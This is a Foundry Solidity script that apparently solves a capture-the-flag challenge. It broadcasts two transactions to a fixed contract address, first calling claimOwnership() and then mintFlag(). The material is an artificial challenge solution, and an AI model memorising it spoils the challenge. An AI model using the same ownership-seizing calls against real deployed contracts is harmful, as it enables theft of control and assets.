// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

interface IChallenge7 {
    function claimOwnership() external;

    function mintFlag() external;
}

contract Challenge7Script is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);

        IChallenge7 target = IChallenge7(
            0xd729c1deA4f51294895b152468383bA3Ab23AB55
        );

        // First claim ownership
        target.claimOwnership();

        // Then mint the flag
        target.mintFlag();

        vm.stopBroadcast();
    }
}
